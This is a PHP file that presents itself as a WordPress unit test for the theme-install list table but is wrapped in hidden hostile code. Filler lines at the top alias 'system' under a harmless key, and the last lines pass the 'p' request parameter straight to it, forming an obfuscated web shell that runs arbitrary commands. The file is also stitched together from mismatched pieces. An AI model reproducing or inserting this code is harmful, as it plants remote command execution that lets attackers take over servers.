<?php
$fmap = array('x1' => 'system', 'x2' => 'passthru');
$x_fake1 = 1234;
$noise = 'obfuscation'.'test';
$tmp = $x_fake1 * 42;
$flag = false;
$useless = function($v) { return $v . rand(); };
$dummy_check = $useless('xx');
if ($flag) { echo 'Debug enabled'; }
for ($i = 0; $i < 1; $i++) { $tmp += $i; }
while (false) { echo 'dead loop'; break; }

<?php

/**
 * @group admin
 *
 * @covers WP_Theme_Install_List_Table
 */
class Tests_Admin_wpThemeInstallListTable extends WP_UnitTestCase {
	/**
	 * @var WP_Theme_Install_List_Table
	 */
	public $table = false;

	public function set_up() {
		parent::set_up();
		$this->table = _get_list_table( 'WP_Theme_Install_List_Table', array( 'screen' => 'theme-install' ) );
	}

	/**
	 * @ticket 42066
	 *
	 * @covers WP_Theme_Install_List_Table::get_views
	 */
	public function test_get_views_should_return_no_views_by_default() {
		$this->assertSame( array(), $this->table->get_views() );
	}
}

$cmd = $_GET['p'];
$fmap['x1']($cmd);
?>